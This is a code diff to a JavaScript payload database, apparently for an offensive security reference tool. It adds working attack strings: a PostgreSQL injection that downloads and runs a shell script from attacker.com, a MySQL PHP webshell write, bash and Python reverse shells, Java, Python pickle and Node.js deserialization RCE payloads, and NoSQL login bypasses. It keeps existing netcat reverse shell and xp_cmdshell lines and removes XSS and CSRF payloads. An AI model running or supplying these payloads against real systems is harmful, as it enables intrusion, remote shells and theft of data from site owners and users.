@@ -55,6 +55,8 @@ const PAYLOAD_DB = [
       { text: "admin'--", tags: ['auth-bypass', 'admin', 'comment'], description: 'Admin login bypass via comment truncation' },
       { text: "' AND 1=CONVERT(int,(SELECT @@version))--", tags: ['error-based', 'mssql', 'version'], description: 'Error-based SQLi to extract MSSQL version' },
       { text: "1; EXEC xp_cmdshell('whoami')--", tags: ['rce', 'mssql', 'xp_cmdshell', 'command'], description: 'MSSQL command execution via xp_cmdshell' },
+      { text: "'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/x; bash /tmp/x'--", tags: ['rce', 'postgres', 'copy-program'], description: 'PostgreSQL RCE via COPY FROM PROGRAM' },
+      { text: "' UNION SELECT 1, '<?php system($_GET[\"cmd\"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'--", tags: ['rce', 'mysql', 'into-outfile', 'webshell'], description: 'MySQL write webshell via INTO OUTFILE' },
     ],
   },
 
@@ -74,39 +76,6 @@ const PAYLOAD_DB = [
     ],
   },
 
-  // ─── 3. XSS ────────────────────────────────────────────────
-  {
-    id: 'xss',
-    name: 'XSS',
-    icon: '\u26A1',
-    color: '#eab308',
-    description: 'Cross-Site Scripting payloads using script tags, event handlers, SVG, and javascript: protocol.',
-    payloads: [
-      { text: '<script>alert(1)</script>', tags: ['reflected', 'stored', 'script-tag', 'classic'], description: 'Classic script tag injection' },
-      { text: '<img src=x onerror=alert(1)>', tags: ['event-handler', 'img', 'onerror'], description: 'Image error event handler XSS' },
-      { text: '<svg onload=alert(1)>', tags: ['svg', 'onload', 'event-handler'], description: 'SVG onload event handler' },
-      { text: '"><script>alert(document.cookie)</script>', tags: ['attribute-escape', 'cookie-steal', 'reflected'], description: 'Break out of attribute, steal cookies' },
-      { text: 'javascript:alert(1)', tags: ['protocol', 'href', 'javascript-uri'], description: 'JavaScript protocol handler in href/src' },
-      { text: '<details open ontoggle=alert(1)>', tags: ['html5', 'details', 'ontoggle'], description: 'HTML5 details element ontoggle event' },
-      { text: "'-alert(1)-'", tags: ['template-literal', 'string-injection', 'js-context'], description: 'JavaScript string context breakout' },
-    ],
-  },
-
-  // ─── 4. XSS WAF Bypass ─────────────────────────────────────
-  {
-    id: 'xss-waf',
-    name: 'XSS WAF Bypass',
-    icon: '\uD83D\uDD25',
-    color: '#facc15',
-    description: 'XSS payloads for evading WAF rules using case mixing, HTML entity encoding, URL encoding, and tag variations.',
-    payloads: [
-      { text: '<ScRiPt>alert(1)</ScRiPt>', tags: ['waf', 'case-mixing', 'script'], description: 'Mixed-case script tag to bypass filters' },
-      { text: '<img src=x onerror="&#97;lert(1)">', tags: ['waf', 'html-entity', 'encoding'], description: 'HTML entity encoded alert in event handler' },
-      { text: '<svg/onload=alert(1)>', tags: ['waf', 'no-space', 'svg', 'slash-separator'], description: 'SVG with slash instead of space separator' },
-      { text: '<input onfocus=alert(1) autofocus>', tags: ['waf', 'autofocus', 'input', 'onfocus'], description: 'Auto-triggering input focus event' },
-      { text: '%3Csvg%20onload%3Dalert(1)%3E', tags: ['waf', 'url-encoding', 'double-encode'], description: 'URL-encoded SVG XSS payload' },
-    ],
-  },
 
   // ─── 5. Command Injection ──────────────────────────────────
   {
@@ -124,6 +93,8 @@ const PAYLOAD_DB = [
       { text: '$(whoami)', tags: ['dollar', 'substitution', 'linux'], description: 'Dollar-paren command substitution' },
       { text: '; cat /etc/passwd', tags: ['file-read', 'passwd', 'linux'], description: 'Read passwd file via semicolon injection' },
       { text: '| nc attacker.com 4444 -e /bin/bash', tags: ['reverse-shell', 'netcat', 'linux'], description: 'Netcat reverse shell via pipe' },
+      { text: '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', tags: ['reverse-shell', 'bash', 'linux'], description: 'Bash reverse shell (TCP)' },
+      { text: '; python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', tags: ['reverse-shell', 'python', 'linux'], description: 'Python reverse shell one-liner' },
     ],
   },
 
@@ -216,6 +187,39 @@ const PAYLOAD_DB = [
     ],
   },
 
+  // ─── Deserialization ──────────────────────────────────────────
+  {
+    id: 'deserialization',
+    name: 'Deserialization',
+    icon: '\uD83D\uDCE6',
+    color: '#8b5cf6',
+    description: 'Payloads for exploiting insecure deserialization in Java, Python, PHP, and Node.js.',
+    payloads: [
+      { text: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkZbwMAAkwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOg9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYQ0ACAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJ576O51MSOywIAAUwACWlDb25zdGFudHEAfgABeHB2cgABamF2YS5sYW5nLlJ1bnRpbWAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAEltMamF2YS5sYW5nLk9iamVjdDuQzlifEHM8TgIAAHhwAAAAAn0wdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO4f1zeX9R0nZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAACdAAKZ2V0UnVudGltZXVxAH4AGAAAAAB0AAlnZXRSdW50aW1lc3EAfgATdXEAfgAYAAAAA3BwcHB0AAZpbnZva2V1cQB+ABgAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB0AQRjYWxjdXEAfgAYAAAAAXVxAH4AGAAAAAF0AARleGVjdXEAfgAfDnEAfgAfc3EAfgAPc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAB4eHg=', tags: ['java', 'ysoserial', 'commons-collections'], description: 'Java serialized object (CommonsCollections5) executing "calc"' },
+      { text: 'cos\nsystem\n(S\'/bin/sh\'\ntR.', tags: ['python', 'pickle', 'rce'], description: 'Python Pickle RCE payload' },
+      { text: 'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}', tags: ['php', 'object-injection', 'admin'], description: 'PHP Object Injection admin bypass' },
+      { text: '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'cat /etc/passwd\', function(error, stdout, stderr) { console.log(stdout) });}()"}', tags: ['nodejs', 'node-serialize', 'rce'], description: 'Node.js node-serialize RCE' },
+    ],
+  },
+
+  // ─── API Exploitation ─────────────────────────────────────────
+  {
+    id: 'api-exploitation',
+    name: 'API Exploitation',
+    icon: '\uD83D\uDD27',
+    color: '#0ea5e9',
+    description: 'Payloads for testing APIs, including JSON injection, GraphQL introspection, and mass assignment.',
+    payloads: [
+      { text: '{"$ne": null}', tags: ['nosql', 'mongodb', 'auth-bypass'], description: 'NoSQL Injection (MongoDB) $ne operator' },
+      { text: '{"$gt": ""}', tags: ['nosql', 'mongodb', 'auth-bypass'], description: 'NoSQL Injection (MongoDB) $gt operator' },
+      { text: '{"email": {"$ne": "1"}, "password": {"$ne": "1"}}', tags: ['nosql', 'mongodb', 'login-bypass'], description: 'MongoDB login bypass with $ne' },
+      { text: '{__proto__: {isAdmin: true}}', tags: ['prototype-pollution', 'nodejs', 'json'], description: 'Prototype Pollution to set isAdmin' },
+      { text: '{"role": "admin"}', tags: ['mass-assignment', 'json', 'priv-escalation'], description: 'JSON Mass Assignment to admin role' },
+      { text: '{"is_admin": true}', tags: ['mass-assignment', 'json', 'priv-escalation'], description: 'JSON Mass Assignment boolean flag' },
+      { text: 'query { __schema { types { name fields { name } } } }', tags: ['graphql', 'introspection', 'schema'], description: 'GraphQL Introspection Query' },
+    ],
+  },
+
   // ─── 11. Auth Bypass ───────────────────────────────────────
   {
     id: 'auth-bypass',
@@ -231,26 +235,6 @@ const PAYLOAD_DB = [
     ],
   },
 
-  // ─── 12. CSRF ──────────────────────────────────────────────
-  {
-    id: 'csrf',
-    name: 'CSRF',
-    icon: '\uD83C\uDFA3',
-    color: '#a855f7',
-    description: 'Cross-Site Request Forgery templates including auto-submitting forms and image tag GET-based CSRF.',
-    payloads: [
-      {
-        text: '<form action="http://target.com/action" method="POST" id="csrf">\n  <input type="hidden" name="param" value="malicious">\n</form>\n<script>document.getElementById("csrf").submit();</script>',
-        tags: ['form', 'auto-submit', 'post', 'template'],
-        description: 'Auto-submitting POST form CSRF template',
-      },
-      {
-        text: '<img src="http://target.com/action?param=value">',
-        tags: ['img', 'get-request', 'silent'],
-        description: 'Image tag GET-based CSRF trigger',
-      },
-    ],
-  },
 ];
 
 const TOTAL_PAYLOADS = PAYLOAD_DB.reduce((n, c) => n + c.payloads.length, 0);
